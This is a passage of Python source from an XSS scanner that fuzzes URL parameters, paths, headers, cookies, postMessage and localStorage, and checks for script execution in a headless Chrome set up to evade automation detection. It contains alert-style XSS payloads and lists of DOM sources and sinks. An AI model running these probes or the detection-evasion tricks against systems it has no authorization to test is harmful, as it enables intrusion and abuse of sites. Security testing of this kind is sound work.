        # ---- Path ----
        vulnerabilities.extend(
            self._test_path(url, http_client, payload_generator)
        )

        # ---- Headers ----
        if self.config.fuzz_headers:
            vulnerabilities.extend(
                self._test_headers(url, http_client, payload_generator)
            )

        # ---- Cookies ----
        if self.config.fuzz_cookies:
            vulnerabilities.extend(
                self._test_cookies(url, http_client, payload_generator)
            )

        return vulnerabilities

    # ============================================================
    # Core reflected parameter testing
    # ============================================================
    def _test_parameter(self, url, param, http_client, payload_generator):
        vulns = []
        payloads = payload_generator.get_reflected_payloads()

        if not self._target_alive(url, http_client):
            return vulns

        for payload in payloads[:self.config.payload_count]:
            try:
                if payload.lower().startswith(("javascript:", "data:")):
                    continue

                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)

                clean = quote(re.sub(r"[\n\r\t]", "", payload), safe="")
                params[param] = [clean]

                test_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    urlencode(params, doseq=True),
                    ""
                ))

                response = http_client.get(test_url)

                # ---- reflection check ----
                if not self._is_reflected(payload, response.text):
                    continue

                if not self._reflection_context_dangerous(payload, response.text):
                    continue

                # ---- security context ----
                security = self._extract_security_context(response)

                # ---- browser execution (ONLY if CSP allows) ----
                browser_exec = False
                if not (security["csp"].has_csp() and security["csp"].blocks_inline()):
                    browser_exec = self._browser_reflected_execution(test_url)

                exploitable = browser_exec

                vuln = Vulnerability(
                    id=hashlib.md5(f"{test_url}:{param}:{payload}".encode()).hexdigest()[:16],
                    type="reflected",
                    url=test_url,
                    method="GET",
                    parameter=param,
                    payload=payload,
                    evidence="Payload reflected in dangerous context",
                    cwe=["CWE-79"],
                    severity="high" if exploitable else "informational",
                    confidence=0.9 if exploitable else 0.3,
                    context={
                        "csp": security["csp"].summary(),
                        "trusted_types": security["trusted_types"],
                        "framework_sinks": security["frameworks"],
                        "browser_execution": browser_exec,
                        "exploitability": exploitable
                    }
                )

                vuln.cvss_score = CVSSCalculator().score(
                    exploitable=exploitable,
                    reflected=True
                )

                if not exploitable:
                    vuln.tags.append("mitigated-by-csp")

                vulns.append(vuln)

            except Exception as e:
                logging.debug(f"Reflected param test failed: {e}")

        return vulns

    # ============================================================
    # Path / header / cookie tests (same logic)
    # ============================================================
    def _test_path(self, url, http_client, payload_generator):
        vulns = []
        payloads = payload_generator.get_reflected_payloads()
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for payload in payloads[:5]:
            try:
                test_url = f"{base}/{payload}"
                response = http_client.get(test_url)

                if not self._is_reflected(payload, response.text):
                    continue

                security = self._extract_security_context(response)

                browser_exec = False
                if not (security["csp"].has_csp() and security["csp"].blocks_inline()):
                    browser_exec = self._browser_reflected_execution(test_url)

                vuln = Vulnerability(
                    id=hashlib.md5(f"path:{test_url}".encode()).hexdigest()[:16],
                    type="reflected",
                    url=test_url,
                    method="GET",
                    parameter="path",
                    payload=payload,
                    evidence="Payload reflected in URL path",
                    severity="high" if browser_exec else "informational",
                    confidence=0.9 if browser_exec else 0.3,
                    cwe=["CWE-79"]
                )

                vuln.cvss_score = CVSSCalculator().score(
                    exploitable=browser_exec,
                    reflected=True
                )

                if not browser_exec:
                    vuln.tags.append("mitigated-by-csp")

                vulns.append(vuln)

            except Exception:
                pass

        return vulns

    def _test_headers(self, url, http_client, payload_generator):
        vulns = []
        payloads = payload_generator.get_reflected_payloads()
        headers_to_test = ["User-Agent", "Referer", "X-Forwarded-For"]

        for header in headers_to_test:
            for payload in payloads[:3]:
                try:
                    response = http_client.get(url, headers={header: payload})

                    if not self._is_reflected(payload, response.text):
                        continue

                    security = self._extract_security_context(response)
                    browser_exec = False

                    if not (security["csp"].has_csp() and security["csp"].blocks_inline()):
                        browser_exec = self._browser_reflected_execution(url)

                    vuln = Vulnerability(
                        id=hashlib.md5(f"{url}:{header}:{payload}".encode()).hexdigest()[:16],
                        type="reflected",
                        url=url,
                        method="GET",
                        parameter=f"header:{header}",
                        payload=payload,
                        evidence=f"Payload reflected via {header}",
                        severity="high" if browser_exec else "informational",
                        confidence=0.9 if browser_exec else 0.3,
                        cwe=["CWE-79"]
                    )

                    vuln.cvss_score = CVSSCalculator().score(
                        exploitable=browser_exec,
                        reflected=True
                    )

                    if not browser_exec:
                        vuln.tags.append("mitigated-by-csp")

                    vulns.append(vuln)

                except Exception:
                    pass

        return vulns

    def _test_cookies(self, url, http_client, payload_generator):
        vulns = []
        payloads = payload_generator.get_reflected_payloads()

        for payload in payloads[:3]:
            try:
                http_client.session.cookies.set("XSS_TEST", payload)
                response = http_client.get(url)

                if not self._is_reflected(payload, response.text):
                    continue

                security = self._extract_security_context(response)
                browser_exec = False

                if not (security["csp"].has_csp() and security["csp"].blocks_inline()):
                    browser_exec = self._browser_reflected_execution(url)

                vuln = Vulnerability(
                    id=hashlib.md5(f"cookie:{url}:{payload}".encode()).hexdigest()[:16],
                    type="reflected",
                    url=url,
                    method="GET",
                    parameter="cookie:XSS_TEST",
                    payload=payload,
                    evidence="Payload reflected via cookie",
                    severity="high" if browser_exec else "informational",
                    confidence=0.9 if browser_exec else 0.3,
                    cwe=["CWE-79"]
                )

                vuln.cvss_score = CVSSCalculator().score(
                    exploitable=browser_exec,
                    reflected=True
                )

                if not browser_exec:
                    vuln.tags.append("mitigated-by-csp")

                vulns.append(vuln)

            except Exception:
                pass

        return vulns

    # ============================================================
    # Helpers
    # ============================================================
    def _target_alive(self, url, client):
        try:
            r = client.get(url)
            return r.status_code < 500
        except Exception:
            return False

    def _is_reflected(self, payload, body):
        variants = [
            payload,
            html.escape(payload),
            quote(payload),
            payload.replace("<", "&lt;").replace(">", "&gt;")
        ]
        return any(v in body for v in variants)

    def _reflection_context_dangerous(self, payload, body):
        escaped = html.escape(payload)
        if escaped in body:
            return False  # safely encoded

        patterns = [
            r"<script[^>]*>.*" + re.escape(payload),
            r"on\w+\s*=\s*['\"].*" + re.escape(payload),
            r"(href|src|action)\s*=\s*['\"].*" + re.escape(payload)
        ]
        return any(re.search(p, body, re.I | re.S) for p in patterns)

    def _browser_reflected_execution(self, url: str) -> bool:
        """
        Selenium-based reflected XSS execution verification.
        Returns True ONLY if JavaScript actually executed in the browser.
        """

        driver = None
        try:
            # --------------------------------------------------
            # Acquire driver from your browser manager
            # --------------------------------------------------
            driver = self.get_headless_browser()  # <-- adapt if needed

            # --------------------------------------------------
            # 1️⃣ Install execution monitor BEFORE navigation
            # --------------------------------------------------
            driver.execute_script("""
                window.__xssExecuted = false;

                // Hook alert / confirm / prompt
                ['alert','confirm','prompt'].forEach(fn => {
                    const original = window[fn];
                    window[fn] = function() {
                        window.__xssExecuted = true;
                        return original ? original.apply(this, arguments) : undefined;
                    };
                });

                // Hook eval / Function
                const originalEval = window.eval;
                window.eval = function() {
                    window.__xssExecuted = true;
                    return originalEval.apply(this, arguments);
                };

                const OriginalFunction = window.Function;
                window.Function = function() {
                    window.__xssExecuted = true;
                    return OriginalFunction.apply(this, arguments);
                };

                // Mutation-based execution (e.g. <img onerror>)
                document.addEventListener("error", function(e) {
                    window.__xssExecuted = true;
                }, true);
            """)

            # --------------------------------------------------
            # 2️⃣ Navigate to target URL
            # --------------------------------------------------
            driver.get(url)

            # --------------------------------------------------
            # 3️⃣ Allow time for async execution
            # --------------------------------------------------
            time.sleep(1.5)

            # --------------------------------------------------
            # 4️⃣ Read execution flag
            # --------------------------------------------------
            executed = driver.execute_script("""
                return window.__xssExecuted === true;
            """)

            return bool(executed)

        except Exception as e:
            logging.debug(f"Browser reflected execution check failed: {e}")
            return False

        finally:
            try:
                if driver:
                    driver.quit()
            except Exception:
                pass


    def get_headless_browser(self):
        """Get headless browser instance - IMPROVED"""
        options = ChromeOptions()
        options.add_argument('--headless=new')  # New headless mode
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--disable-blink-features=AutomationControlled')

        # Performance optimizations
        options.add_argument('--disable-extensions')
        options.add_argument('--disable-notifications')
        options.add_argument('--disable-popup-blocking')
        options.add_argument('--disable-default-apps')
        options.add_argument('--disable-infobars')

        # Disable images for faster loading
        prefs = {
            "profile.managed_default_content_settings.images": 2,
            "profile.default_content_setting_values.notifications": 2,
            "profile.default_content_setting_values.popups": 2
        }
        options.add_experimental_option("prefs", prefs)

        # Add experimental options to avoid detection
        options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
        options.add_experimental_option('useAutomationExtension', False)

        # Add performance arguments
        options.add_argument('--disable-software-rasterizer')
        options.add_argument('--disable-web-security')
        options.add_argument('--disable-features=VizDisplayCompositor')

        try:
            driver = webdriver.Chrome(options=options)

            # Set timeouts
            driver.set_page_load_timeout(30)
            driver.set_script_timeout(30)

            # Execute CDP commands to avoid detection
            driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
                'source': '''
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined
                    });
                    Object.defineProperty(navigator, 'plugins', {
                        get: () => [1, 2, 3, 4, 5]
                    });
                    Object.defineProperty(navigator, 'languages', {
                        get: () => ['en-US', 'en']
                    });
                '''
            })

            return driver

        except Exception as e:
            logging.error(f"Failed to create Chrome driver: {e}")
            raise

    def _extract_security_context(self, response):
        headers = dict(response.headers)
        return {
            "csp": CSPAnalyzer(headers),
            "trusted_types": TrustedTypesDetector().detect(headers),
            "frameworks": FrameworkSinkDetector().detect(response.text)
        }






class DOMXSSDetector:
    """Detect DOM-based XSS vulnerabilities"""

    def __init__(self, config: ScannerConfig = None):
        self.config = config or ScannerConfig()
        self.sources = [
            'location.hash', 'location.search', 'document.URL',
            'document.referrer', 'window.name', 'localStorage',
            'sessionStorage', 'document.cookie', 'postMessage',
            'URLSearchParams', 'history.pushState'
        ]
        self.sinks = [
            'innerHTML', 'outerHTML', 'document.write',
            'document.writeln', 'eval', 'Function',
            'setTimeout', 'setInterval', 'execScript',
            'location', 'location.href', 'location.assign',
            'location.replace', 'open', 'window.open'
        ]
        self.payload_generator = XSSPayloadGenerator()

    def test(self, url: str, http_client: AdvancedHTTPClient,
             payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test for DOM XSS using Selenium - FIXED with timeout"""
        vulnerabilities = []

        if not SELENIUM_AVAILABLE:
            logging.warning("Selenium not available for DOM XSS testing")
            return vulnerabilities

        driver = None
        try:
            # Launch browser with timeout
            driver = self.get_headless_browser()

            # Set page load timeout
            driver.set_page_load_timeout(self.config.timeout)
            driver.set_script_timeout(self.config.timeout)

            # Navigate with retry
            for attempt in range(3):
                try:
                    driver.get(url)
                    break
                except Exception as e:
                    if attempt == 2:
                        raise
                    logging.debug(f"Page load attempt {attempt + 1} failed: {e}")
                    time.sleep(2)

            # Wait for page to load with explicit wait
            try:
                WebDriverWait(driver, 10).until(
                    lambda d: d.execute_script('return document.readyState') == 'complete'
                )
            except:
                logging.debug(f"Page readyState not complete for {url}")

            # Get page source after JavaScript execution
            rendered_html = driver.page_source

            # Analyze JavaScript
            js_analysis = self.analyze_javascript(driver)

            # Test DOM XSS vectors with individual timeouts
            test_functions = [
                (self.test_hash_based, [driver, payload_generator]),
                (self.test_url_parameters, [driver, payload_generator]),
                (self.test_document_write, [driver, payload_generator]),
                (self.test_innerhtml, [driver, payload_generator]),
                (self.test_postmessage,[driver,payload_generator]),
                (self.test_local_storage,[driver,payload_generator]),
            ]

            for test_func, args in test_functions:
                try:
                    # Execute with timeout
                    result = self.execute_with_timeout(test_func, args, timeout=15)
                    vulnerabilities.extend(result)
                except TimeoutError:
                    logging.debug(f"Test {test_func.__name__} timed out for {url}")
                except Exception as e:
                    logging.debug(f"Test {test_func.__name__} failed: {e}")

            # Analyze static JavaScript
            static_vulns = self.analyze_static_javascript(rendered_html)
            vulnerabilities.extend(static_vulns)

        except TimeoutError:
            logging.warning(f"DOM XSS test timed out for {url}")
        except Exception as e:
            logging.error(f"DOM XSS test failed for {url}: {e}")
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass

        return vulnerabilities

    def _extract_dom_security_context(self, driver) -> Dict[str, Any]:
        """
        Extract browser-enforced security controls relevant to DOM XSS.
        """
        headers = {}

        # --------------------------------------------------
        # 1️⃣ Extract CSP from *HTTP response headers*
        # --------------------------------------------------
        try:
            # Selenium cannot directly read response headers,
            # so we fetch via fetch() from the browser context
            csp_header = driver.execute_async_script("""
                var callback = arguments[arguments.length - 1];
                fetch(window.location.href, { method: 'HEAD', credentials: 'same-origin' })
                    .then(r => callback(r.headers.get('Content-Security-Policy') || ""))
                    .catch(() => callback(""));
            """)

            if csp_header:
                headers["Content-Security-Policy"] = csp_header
        except Exception:
            pass

        # --------------------------------------------------
        # 2️⃣ Fallback: meta CSP (less common but valid)
        # --------------------------------------------------
        try:
            meta_csp = driver.execute_script("""
                var m = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
                return m ? m.content : "";
            """)
            if meta_csp:
                headers["Content-Security-Policy"] = meta_csp
        except Exception:
            pass

        # --------------------------------------------------
        # 3️⃣ Analyze CSP correctly
        # --------------------------------------------------
        csp = CSPAnalyzer(headers)

        # --------------------------------------------------
        # 4️⃣ Trusted Types detection (CSP + runtime)
        # --------------------------------------------------
        trusted_types = False
        try:
            if csp.has_directive("require-trusted-types-for"):
                trusted_types = True
            else:
                # Runtime detection
                trusted_types = driver.execute_script("""
                    return typeof window.trustedTypes !== "undefined";
                """)
        except Exception:
            pass

        # --------------------------------------------------
        # 5️⃣ Framework detection from rendered DOM
        # --------------------------------------------------
        html = driver.page_source
        frameworks = FrameworkSinkDetector().detect(html)

        return {
            "csp": csp,
            "trusted_types": trusted_types,
            "frameworks": frameworks
        }

    def _dom_exploitable(self, payload: str, driver, security_ctx: Dict[str, Any]) -> bool:
        csp = security_ctx["csp"]

        # 1. CSP blocks inline JS → stop
        if csp.has_csp() and csp.blocks_inline():
            return False

        # 2. Trusted Types enforced → stop raw HTML sinks
        if security_ctx["trusted_types"]:
            return False

        # 3. Real browser execution check
        return self.check_payload_execution(payload, driver)

    def execute_with_timeout(self, func, args, timeout=10):
        """Execute function with timeout"""
        import threading

        class InterruptableThread(threading.Thread):
            def __init__(self):
                super().__init__()
                self.result = None
                self.exception = None

            def run(self):
                try:
                    self.result = func(*args)
                except Exception as e:
                    self.exception = e

        thread = InterruptableThread()
        thread.start()
        thread.join(timeout)

        if thread.is_alive():
            raise TimeoutError(f"Function {func.__name__} timed out after {timeout}s")

        if thread.exception:
            raise thread.exception

        return thread.result

    def get_headless_browser(self):
        """Get headless browser instance - IMPROVED"""
        options = ChromeOptions()
        options.add_argument('--headless=new')  # New headless mode
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--disable-blink-features=AutomationControlled')

        # Performance optimizations
        options.add_argument('--disable-extensions')
        options.add_argument('--disable-notifications')
        options.add_argument('--disable-popup-blocking')
        options.add_argument('--disable-default-apps')
        options.add_argument('--disable-infobars')

        # Disable images for faster loading
        prefs = {
            "profile.managed_default_content_settings.images": 2,
            "profile.default_content_setting_values.notifications": 2,
            "profile.default_content_setting_values.popups": 2
        }
        options.add_experimental_option("prefs", prefs)

        # Add experimental options to avoid detection
        options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
        options.add_experimental_option('useAutomationExtension', False)

        # Add performance arguments
        options.add_argument('--disable-software-rasterizer')
        options.add_argument('--disable-web-security')
        options.add_argument('--disable-features=VizDisplayCompositor')

        try:
            driver = webdriver.Chrome(options=options)

            # Set timeouts
            driver.set_page_load_timeout(30)
            driver.set_script_timeout(30)

            # Execute CDP commands to avoid detection
            driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
                'source': '''
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined
                    });
                    Object.defineProperty(navigator, 'plugins', {
                        get: () => [1, 2, 3, 4, 5]
                    });
                    Object.defineProperty(navigator, 'languages', {
                        get: () => ['en-US', 'en']
                    });
                '''
            })

            return driver

        except Exception as e:
            logging.error(f"Failed to create Chrome driver: {e}")
            raise

    def analyze_javascript(self, driver) -> Dict:
        """Analyze JavaScript on page"""
        analysis = {
            'sources_found': [],
            'sinks_found': [],
            'data_flows': [],
            'event_listeners': [],
            'dom_manipulations': []
        }

        try:
            # Execute JavaScript to find sources and sinks
            js_code = """
            var sources = [];
            var sinks = [];
            var events = [];
            var manipulations = [];

            // Check for common sources
            if (window.location && window.location.hash) sources.push('location.hash');
            if (window.location && window.location.search) sources.push('location.search');
            if (document.URL) sources.push('document.URL');
            if (document.referrer) sources.push('document.referrer');
            if (window.name) sources.push('window.name');
            if (document.cookie) sources.push('document.cookie');
            if (window.localStorage) sources.push('localStorage');
            if (window.sessionStorage) sources.push('sessionStorage');

            // Check for common sinks in code (simplified check)
            var scripts = document.getElementsByTagName('script');
            for (var i = 0; i < scripts.length; i++) {
                var scriptContent = scripts[i].textContent || scripts[i].innerText;
                if (scriptContent.includes('innerHTML')) sinks.push('innerHTML');
                if (scriptContent.includes('outerHTML')) sinks.push('outerHTML');
                if (scriptContent.includes('document.write')) sinks.push('document.write');
                if (scriptContent.includes('eval(')) sinks.push('eval');
                if (scriptContent.includes('Function(')) sinks.push('Function');
            }

            // Return results
            return {
                sources: Array.from(new Set(sources)),
                sinks: Array.from(new Set(sinks)),
                events: events,
                manipulations: manipulations
            };
            """

            result = driver.execute_script(js_code)
            analysis['sources_found'] = result.get('sources', [])
            analysis['sinks_found'] = result.get('sinks', [])
            analysis['event_listeners'] = result.get('events', [])
            analysis['dom_manipulations'] = result.get('manipulations', [])

        except Exception as e:
            logging.debug(f"JS analysis failed: {e}")

        return analysis

    def test_hash_based(self, driver, payload_generator) -> List[Vulnerability]:
        """Test hash-based DOM XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_dom_payloads()

        for payload in payloads[:self.config.payload_count]:
            try:
                test_url = f"{driver.current_url}#{payload}"
                driver.get(test_url)
                time.sleep(1)

                # Check if payload executed
                if self.check_payload_execution(payload, driver):
                    security = self._extract_dom_security_context(driver)

                    vuln = Vulnerability(
                        id=hashlib.md5(f"hash:{test_url}".encode()).hexdigest()[:16],
                        type="dom",
                        url=test_url,
                        method="GET",
                        parameter="hash",
                        payload=payload,
                        evidence="Hash-based DOM XSS",
                        confidence=0.9,
                        severity="high",
                        cwe=["CWE-79"],
                        context={
                            "csp": security["csp"].summary(),
                            "trusted_types": security["trusted_types"],
                            "framework_sinks": security["frameworks"]
                        }
                    )

                    exploitability = self._dom_exploitable(payload, driver, security)

                    if exploitability:
                        vuln.severity = "high"
                        vuln.confidence = 0.9
                    else:
                        vuln.severity = "informational"
                        vuln.confidence = 0.3
                        vuln.tags.append("mitigated-by-csp")

                    # -----------------------------
                    # CVSS calculation (HERE)
                    # -----------------------------
                    cvss = CVSSCalculator().score(
                        exploitable=exploitability,
                        dom=True
                    )
                    vuln.cvss_score = cvss

                    # -----------------------------
                    # Context enrichment
                    # -----------------------------
                    vuln.context.update({
                        "csp": security["csp"].summary(),
                        "trusted_types": security["trusted_types"],
                        "framework_sinks": security["frameworks"],
                        "exploitability": exploitability
                    })

                    vulnerabilities.append(vuln)

            except Exception as e:
                logging.debug(f"Hash test failed: {e}")

        return vulnerabilities

    def test_postmessage(self, driver, payload_generator) -> List[Vulnerability]:
        """Test postMessage-based DOM XSS"""
        vulnerabilities = []

        try:
            # Inject iframe to test postMessage
            iframe_script = """
            var iframe = document.createElement('iframe');
            iframe.src = 'about:blank';
            document.body.appendChild(iframe);
            return iframe.contentWindow;
            """

            target_window = driver.execute_script(iframe_script)

            # Test postMessage payloads
            payloads = [
                {"data": "<script>alert(1)</script>", "origin": "*"},
                {"data": "<img src=x onerror=alert(1)>", "origin": driver.current_url},
                {"data": "javascript:alert(1)", "origin": "*"}
            ]

            for payload_data in payloads:
                try:
                    postmessage_script = f"""
                    window.postMessage({json.dumps(payload_data['data'])}, '{payload_data['origin']}');
                    return true;
                    """
                    driver.execute_script(postmessage_script)
                    time.sleep(1)

                    # Check for alerts or errors
                    if self.check_for_alerts(driver):
                        security = self._extract_dom_security_context(driver)


                        vuln = Vulnerability(
                            id=hashlib.md5(f"postmessage:{driver.current_url}".encode()).hexdigest()[:16],
                            type="dom",
                            url=driver.current_url,
                            method="POST",
                            parameter="postMessage",
                            payload=str(payload_data),
                            evidence="postMessage DOM XSS",
                            confidence=0.9,
                            severity="high",
                            cwe=["CWE-79"],
                            context={
                                "csp": security["csp"].summary(),
                                "trusted_types": security["trusted_types"],
                                "framework_sinks": security["frameworks"]
                            }

                        )



                        exploitability = self._dom_exploitable(payload_data['data'], driver, security)

                        if exploitability:
                            vuln.severity = "high"
                            vuln.confidence = 0.9
                        else:
                            vuln.severity = "informational"
                            vuln.confidence = 0.3
                            vuln.tags.append("mitigated-by-csp")

                        # -----------------------------
                        # CVSS calculation (HERE)
                        # -----------------------------
                        cvss = CVSSCalculator().score(
                            exploitable=exploitability,
                            dom=True
                        )
                        vuln.cvss_score = cvss

                        # -----------------------------
                        # Context enrichment
                        # -----------------------------
                        vuln.context.update({
                            "csp": security["csp"].summary(),
                            "trusted_types": security["trusted_types"],
                            "framework_sinks": security["frameworks"],
                            "exploitability": exploitability
                        })

                        vulnerabilities.append(vuln)

                except Exception as e:
                    logging.debug(f"postMessage test failed: {e}")

        except Exception as e:
            logging.debug(f"postMessage setup failed: {e}")

        return vulnerabilities

    def test_local_storage(self, driver, payload_generator) -> List[Vulnerability]:
        """Test localStorage-based DOM XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_dom_payloads()

        for payload in payloads[:min(5, self.config.payload_count)]:
            try:
                # Set localStorage
                set_script = f"""
                localStorage.setItem('xss_test', '{payload}');
                return localStorage.getItem('xss_test');
                """

                result = driver.execute_script(set_script)

                # Try to trigger retrieval and execution
                trigger_script = """
                var stored = localStorage.getItem('xss_test');
                if (stored && stored.includes('<script>')) {
                    // Simulate eval
                    return true;
                }
                return false;
                """

                triggered = driver.execute_script(trigger_script)
                if triggered:
                    security = self._extract_dom_security_context(driver)


                    vuln = Vulnerability(
                        id=hashlib.md5(f"localstorage:{driver.current_url}".encode()).hexdigest()[:16],
                        type="dom",
                        url=driver.current_url,
                        method="GET",
                        parameter="localStorage",
                        payload=payload,
                        evidence="localStorage DOM XSS",
                        confidence=0.5,
                        severity="medium",
                        cwe=["CWE-79"],
                        context={
                            "csp": security["csp"].summary(),
                            "trusted_types": security["trusted_types"],
                            "framework_sinks": security["frameworks"]
                        }
                    )

                    exploitability = self._dom_exploitable(payload, driver, security)

                    if exploitability:
                        vuln.severity = "high"
                        vuln.confidence = 0.9
                    else:
                        vuln.severity = "informational"
                        vuln.confidence = 0.3
                        vuln.tags.append("mitigated-by-csp")

                    # -----------------------------
                    # CVSS calculation (HERE)
                    # -----------------------------
                    cvss = CVSSCalculator().score(
                        exploitable=exploitability,
                        dom=True
                    )
                    vuln.cvss_score = cvss

                    # -----------------------------
                    # Context enrichment
                    # -----------------------------
                    vuln.context.update({
                        "csp": security["csp"].summary(),
                        "trusted_types": security["trusted_types"],
                        "framework_sinks": security["frameworks"],
                        "exploitability": exploitability
                    })

                    vulnerabilities.append(vuln)

            except Exception as e:
                logging.debug(f"localStorage test failed: {e}")

        return vulnerabilities

    def test_url_parameters(self, driver, payload_generator) -> List[Vulnerability]:
        """Test URL parameter-based DOM XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_dom_payloads()
        current_url = driver.current_url
        parsed = urlparse(current_url)

        # Test URL.searchParams
        for payload in payloads[:min(10, self.config.payload_count)]:
            try:
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?test={payload}"
                driver.get(test_url)
                time.sleep(1)

                # Check if URL parameters are used dangerously
                check_script = f"""
                var urlParams = new URLSearchParams(window.location.search);
                var testParam = urlParams.get('test');
                if (testParam && testParam.includes('<')) {{
                    // Check if it's used in dangerous sinks
                    var scripts = document.getElementsByTagName('script');
                    for (var i = 0; i < scripts.length; i++) {{
                        if (scripts[i].textContent.includes(testParam)) {{
                            return true;
                        }}
                    }}
                }}
                return false;
                """

                is_dangerous = driver.execute_script(check_script)
                if is_dangerous:
                    security = self._extract_dom_security_context(driver)


                    vuln = Vulnerability(
                        id=hashlib.md5(f"urlparam:{test_url}".encode()).hexdigest()[:16],
                        type="dom",
                        url=test_url,
                        method="GET",
                        parameter="test",
                        payload=payload,
                        evidence="URL parameter DOM XSS",
                        confidence=0.7,
                        severity="high",
                        cwe=["CWE-79"],
                        context={
                            "csp": security["csp"].summary(),
                            "trusted_types": security["trusted_types"],
                            "framework_sinks": security["frameworks"]
                        }
                    )

                    exploitability = self._dom_exploitable(payload, driver, security)

                    if exploitability:
                        vuln.severity = "high"
                        vuln.confidence = 0.9
                    else:
                        vuln.severity = "informational"
                        vuln.confidence = 0.3
                        vuln.tags.append("mitigated-by-csp")

                    # -----------------------------
                    # CVSS calculation (HERE)
                    # -----------------------------
                    cvss = CVSSCalculator().score(
                        exploitable=exploitability,
                        dom=True
                    )
                    vuln.cvss_score = cvss

                    # -----------------------------
                    # Context enrichment
                    # -----------------------------
                    vuln.context.update({
                        "csp": security["csp"].summary(),
                        "trusted_types": security["trusted_types"],
                        "framework_sinks": security["frameworks"],
                        "exploitability": exploitability
                    })

                    vulnerabilities.append(vuln)

            except Exception as e:
                logging.debug(f"URL parameter test failed: {e}")

        return vulnerabilities

    def test_document_write(self, driver, payload_generator) -> List[Vulnerability]:
        """
        Detect document.write DOM XSS *without forcing execution*
        """
        vulnerabilities = []

        try:
            # 1️⃣ Detect if document.write is used at all
            uses_document_write = driver.execute_script("""
                var scripts = document.getElementsByTagName('script');
                for (var i = 0; i < scripts.length; i++) {
                    var code = scripts[i].textContent || '';
                    if (code.includes('document.write')) {
                        return true;
                    }
                }
                return false;
            """)

            if not uses_document_write:
                return vulnerabilities  # ✅ no sink, no issue

            # 2️⃣ Check if document.write uses user-controlled sources
            uses_user_input = driver.execute_script("""
                var scripts = document.getElementsByTagName('script');
                var sources = ['location', 'search', 'hash', 'document.URL', 'document.referrer'];
                for (var i = 0; i < scripts.length; i++) {
                    var code = scripts[i].textContent || '';
                    if (code.includes('document.write')) {
                        for (var j = 0; j < sources.length; j++) {
                            if (code.includes(sources[j])) {
                                return true;
                            }
                        }
                    }
                }
                return false;
            """)

            # 3️⃣ Extract security context (CSP, Trusted Types, frameworks)
            security = self._extract_dom_security_context(driver)

            # 4️⃣ Decide exploitability
            exploitable = uses_user_input and self._dom_exploitable(
                "<dom-sink>",
                driver,
                security
            )

            # 5️⃣ Build vulnerability
            vuln = Vulnerability(
                id=hashlib.md5(
                    f"documentwrite:{driver.current_url}".encode()
                ).hexdigest()[:16],
                type="dom",
                url=driver.current_url,
                method="GET",
                parameter="document.write",
                payload="<user-controlled data>",
                evidence="document.write sink detected in application JavaScript",
                cwe=["CWE-79"],
                severity="high" if exploitable else "informational",
                confidence=0.9 if exploitable else 0.3,
                context={
                    "csp": security["csp"].summary(),
                    "trusted_types": security["trusted_types"],
                    "framework_sinks": security["frameworks"],
                    "uses_user_input": uses_user_input,
                    "exploitability": exploitable
                }
            )

            # 6️⃣ CVSS calculation (ONLY HERE)
            vuln.cvss_score = CVSSCalculator().score(
                exploitable=exploitable,
                dom=True
            )

            if not exploitable:
                vuln.tags.append("mitigated-by-csp")

            vulnerabilities.append(vuln)

        except Exception as e:
            logging.debug(f"document.write analysis failed: {e}")

        return vulnerabilities

    def test_innerhtml(self, driver, payload_generator) -> List[Vulnerability]:
        """
        Detect innerHTML-based DOM XSS without forcing execution
        """
        vulnerabilities = []

        try:
            # 1️⃣ Detect if innerHTML is used anywhere
            uses_innerhtml = driver.execute_script("""
                var elements = document.querySelectorAll('*');
                for (var i = 0; i < elements.length; i++) {
                    if (elements[i].innerHTML &&
                        elements[i].innerHTML.includes('<') &&
                        elements[i].innerHTML.includes('>')) {
                        return true;
                    }
                }
                return false;
            """)

            if not uses_innerhtml:
                return vulnerabilities  # ✅ no sink → no issue

            # 2️⃣ Detect if innerHTML is fed by user-controlled sources
            uses_user_input = driver.execute_script("""
                var scripts = document.getElementsByTagName('script');
                var sources = [
                    'location',
                    'location.search',
                    'location.hash',
                    'document.URL',
                    'document.referrer'
                ];

                for (var i = 0; i < scripts.length; i++) {
                    var code = scripts[i].textContent || '';
                    if (code.includes('innerHTML')) {
                        for (var j = 0; j < sources.length; j++) {
                            if (code.includes(sources[j])) {
                                return true;
                            }
                        }
                    }
                }
                return false;
            """)

            # 3️⃣ Extract DOM security context
            security = self._extract_dom_security_context(driver)

            # 4️⃣ Decide exploitability
            exploitable = uses_user_input and self._dom_exploitable(
                "<dom-sink>",
                driver,
                security
            )

            # 5️⃣ Build vulnerability
            vuln = Vulnerability(
                id=hashlib.md5(
                    f"innerhtml:{driver.current_url}".encode()
                ).hexdigest()[:16],
                type="dom",
                url=driver.current_url,
                method="GET",
                parameter="innerHTML",
                payload="<user-controlled data>",
                evidence="innerHTML sink detected with user-controlled source",
                cwe=["CWE-79"],
                severity="high" if exploitable else "informational",
                confidence=0.9 if exploitable else 0.3,
                context={
                    "csp": security["csp"].summary(),
                    "trusted_types": security["trusted_types"],
                    "framework_sinks": security["frameworks"],
                    "uses_user_input": uses_user_input,
                    "exploitability": exploitable
                }
            )

            # 6️⃣ CVSS calculation (ONLY AFTER exploitability)
            vuln.cvss_score = CVSSCalculator().score(
                exploitable=exploitable,
                dom=True
            )

            if not exploitable:
                vuln.tags.append("mitigated-by-csp")

            vulnerabilities.append(vuln)

        except Exception as e:
            logging.debug(f"innerHTML analysis failed: {e}")

